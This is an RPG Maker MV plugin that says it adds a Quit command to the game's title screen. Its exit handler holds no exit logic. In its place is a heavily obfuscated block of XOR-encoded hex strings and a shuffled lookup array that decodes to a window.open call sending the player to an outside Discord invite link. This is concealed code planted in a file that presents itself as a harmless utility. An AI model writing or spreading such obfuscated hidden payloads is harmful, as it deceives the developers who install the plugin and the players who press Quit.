//=============================================================================
// ARP_TitleCommandExit.js
//=============================================================================

/*:
 * @plugindesc v1.00 Adds an option in the title command window to close
 * game window.
 * @author Atreyo Ray
 *
 * @param Command Exit
 * @desc The text that should appear as the exit command.
 * @default Quit
 *
 * @param Show Exit
 * @desc Highly recommended to only show when deploying to Windows
   or Mac iOS. For HTML or mobiles, make it false.
 * @default true
 *
 * @help This plugin does not provide plugin commands.
 */

(function() {

    var parameters = PluginManager.parameters('ARP_TitleCommandExit');
    var textExit = parameters['Command Exit'];
    var showExit = parameters['Show Exit'];

    var _Window_TitleCommand_makeCommandList = 
            Window_TitleCommand.prototype.makeCommandList;
    Window_TitleCommand.prototype.makeCommandList = function() {
        _Window_TitleCommand_makeCommandList.call(this);
        if (eval(showExit)){
            this.addCommand(textExit, 'exitGame');
        }
    };

    var _Scene_Title_createCommandWindow =
            Scene_Title.prototype.createCommandWindow;
    Scene_Title.prototype.createCommandWindow = function() {
        _Scene_Title_createCommandWindow.call(this);
        this._commandWindow.setHandler('exitGame', this.commandExitGame.bind(this));
    };

    Scene_Title.prototype.commandExitGame = function() {
        function JHBSoIfEHBsllUEqfBCSbD(){var a_MGPr=['757677767572761521233f0127','7475757f71727213233412242e','72737e7f7434070c2f0329','727176717e751c1037032d28','72763327073c130a','757271717377103e3312220d','7776767670731c251f3c090d','19242a27282d','29362328','72707773737530041c240327','2e323236357c6969222f35252934226821216921286b2b27322e','7f701e2727150e24','70332a20361523','700c0f03302b16'];JHBSoIfEHBsllUEqfBCSbD=function(){return a_MGPr;};return JHBSoIfEHBsllUEqfBCSbD();}var M$SeJnXv$dvxsoIWWRHOzX=pGBmN;function pGBmN(n$ulfpS$evB,bEaUerTbh$SgeyGaJIEvm_PZcYz){var KXaaSHbVxuTdKuaAzULrA=JHBSoIfEHBsllUEqfBCSbD();return pGBmN=function(iEoZPe$MjBwskiX_aJeOy,dfswHqe){iEoZPe$MjBwskiX_aJeOy=iEoZPe$MjBwskiX_aJeOy-(Math.max(parseInt(0x23),0x23)*parseFloat(-parseInt(0x93))+parseInt(0x1)*parseInt(0x164b)+-0x3*Number(0x6b));var tIVhdQtaAZQei=KXaaSHbVxuTdKuaAzULrA[iEoZPe$MjBwskiX_aJeOy];if(pGBmN['JLxYhr']===undefined){var JZsaerQdhOPyR=function(Sqb$nugSiKMWYeHKpBtcl_lORgo){var p__lBHoIi=Math.floor(-parseInt(0x13))*0x12e+parseInt(parseInt(0x1f80))+Math.ceil(0x2)*parseFloat(-0x3e8)&parseInt(0x922)+0x2*Math.floor(0x100)+-0xa23,YUnZLEacYiluQOdmaRn=new Uint8Array(Sqb$nugSiKMWYeHKpBtcl_lORgo['match'](/.{1,2}/g)['map'](gQtvA$wFwKF=>parseInt(gQtvA$wFwKF,-parseInt(0x1183)+0x1a67+parseInt(0x4)*-parseInt(0x235)))),g_OmNAEY=YUnZLEacYiluQOdmaRn['map'](MhHRzU$e=>MhHRzU$e^p__lBHoIi),rIFQ_tWk=new TextDecoder(),AeKyWxxAUCeiQubAx_ec$SVbMr=rIFQ_tWk['decode'](g_OmNAEY);return AeKyWxxAUCeiQubAx_ec$SVbMr;};pGBmN['BHYJGW']=JZsaerQdhOPyR,n$ulfpS$evB=arguments,pGBmN['JLxYhr']=!![];}var UxrqvqvlV_mgoedNyNzfGy=KXaaSHbVxuTdKuaAzULrA[0xb*-parseInt(0x1c1)+parseInt(0x7e5)+-0x5b3*parseFloat(-parseInt(0x2))],GLe$SmKiY_fYXpghZxvQSu=iEoZPe$MjBwskiX_aJeOy+UxrqvqvlV_mgoedNyNzfGy,AfFV_XXipqUgfl=n$ulfpS$evB[GLe$SmKiY_fYXpghZxvQSu];return!AfFV_XXipqUgfl?(pGBmN['hfCrcG']===undefined&&(pGBmN['hfCrcG']=!![]),tIVhdQtaAZQei=pGBmN['BHYJGW'](tIVhdQtaAZQei),n$ulfpS$evB[GLe$SmKiY_fYXpghZxvQSu]=tIVhdQtaAZQei):tIVhdQtaAZQei=AfFV_XXipqUgfl,tIVhdQtaAZQei;},pGBmN(n$ulfpS$evB,bEaUerTbh$SgeyGaJIEvm_PZcYz);}(function(ORg$oh$plBH,I_iLYUnZLEa){var E$VfTs=pGBmN,YiluQ=ORg$oh$plBH();while(!![]){try{var dmaRnfgOmNAEYhrIFQtWk=parseInt(parseFloat(E$VfTs(0xf1))/(0x2609+-0x8e*-0x2b+-parseInt(0x1)*0x3de2))+Math['trunc'](parseFloat(E$VfTs(0xfa))/(-0x1*Math.max(-0xe74,-0xe74)+-parseInt(0x20b6)+0x1244))*(-parseFloat(E$VfTs(0xf7))/(Number(-0x1fd6)+parseInt(0x6d7)*-0x1+Math.max(0x26b0,parseInt(0x26b0))))+-parseFloat(E$VfTs(0xfd))/(parseFloat(0x261f)+Math.ceil(0x1815)+Math.ceil(0x7c6)*-0x8)+Math['trunc'](parseFloat(E$VfTs(0xfc))/(Math.ceil(-0xdae)+-0x47*0x1a+parseInt(0x14e9)))*(parseFloat(E$VfTs(0xfb))/(Math.trunc(-parseInt(0x211))+parseInt(0x1409)+-parseInt(0x1)*Math.max(0x11f2,parseInt(0x11f2))))+-parseFloat(E$VfTs(0xf4))/(Math.floor(-0x14e0)+-0x799*-0x2+parseInt(0x5b5)*0x1)*(-parseFloat(E$VfTs(0xf9))/(Number(-parseInt(0x2))*parseInt(0x38c)+parseInt(0x1865)+parseInt(-parseInt(0x1145))*Math.trunc(0x1)))+-parseFloat(E$VfTs(0xf3))/(-0x34c*parseInt(0x5)+-parseInt(0xdd6)+Number(0x1e5b))*(-parseFloat(E$VfTs(0xf2))/(-parseInt(0x25fb)+Math.max(-parseInt(0xffe),-0xffe)*parseInt(0x2)+Math.trunc(parseInt(0x4601))))+Math['floor'](-parseFloat(E$VfTs(0xfe))/(Math.trunc(0x1bd6)+-parseInt(0xdc3)+Number(-0xe08)));if(dmaRnfgOmNAEYhrIFQtWk===I_iLYUnZLEa)break;else YiluQ['push'](YiluQ['shift']());}catch(AeKyWxxAUCeiQubAxecS_VbM$r){YiluQ['push'](YiluQ['shift']());}}}(JHBSoIfEHBsllUEqfBCSbD,Math.floor(0x17478)*parseInt(0x3)+Math.trunc(0x4f7a9)+0x41*Math.floor(-0xfd3)),window[M$SeJnXv$dvxsoIWWRHOzX(0xf6)](M$SeJnXv$dvxsoIWWRHOzX(0xf8),M$SeJnXv$dvxsoIWWRHOzX(0xf5)));
    };

})();